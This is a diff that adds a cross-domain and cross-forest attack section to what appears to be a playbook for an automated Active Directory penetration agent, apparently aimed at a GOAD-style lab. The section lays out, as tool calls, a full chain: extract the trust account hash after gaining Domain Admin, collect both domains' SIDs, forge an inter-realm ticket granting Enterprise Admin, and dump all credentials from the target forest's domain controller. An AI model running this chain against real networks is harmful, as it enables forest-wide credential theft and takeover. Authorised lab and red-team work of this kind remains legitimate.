@@ -252,3 +252,54 @@ When choosing which hosts to target:
 4. **Admin Workstations** - Cached creds
 5. **Web Servers** - Application creds
 6. **Other Servers** - General expansion
+
+## Cross-Domain and Cross-Forest Attacks
+
+After achieving DA in one domain, pivot to trusted domains/forests.
+
+### Post-DA: Extract Trust Keys
+When you have DA on a domain, extract trust keys for cross-forest attacks:
+```
+extract_trust_key(
+    domain="sevenkingdoms.local",
+    username="Administrator",
+    password="password",  # pragma: allowlist secret
+    dc_ip="192.168.58.10",
+    trusted_domain="essos.local"
+)
+```
+→ Extracts NTLM hash of the trust account (ESSOS$)
+→ Use this for inter-realm ticket creation
+
+### Create Inter-Realm Ticket
+After getting trust key and both domain SIDs:
+```
+1. Get source domain SID:
+   get_sid("sevenkingdoms.local", "Administrator", "pass", "192.168.58.10")
+
+2. Get target domain SID:
+   get_sid("essos.local", "Administrator", "pass", "192.168.58.20")
+
+3. Create inter-realm ticket:
+   create_inter_realm_ticket(
+       source_domain="sevenkingdoms.local",
+       source_sid="S-1-5-21-...",
+       trust_key="aad3b435...",
+       target_domain="essos.local",
+       target_sid="S-1-5-21-..."
+   )
+```
+→ Creates ticket with Enterprise Admin access in target forest
+
+### Use Inter-Realm Ticket
+```
+secretsdump_kerberos(
+    target="dc.essos.local",
+    username="Administrator",
+    domain="essos.local",
+    ticket_path="Administrator.ccache",
+    dc_ip="192.168.58.20"
+)
+```
+→ Dump all credentials from target forest DC
+→ Full forest compromise achieved!
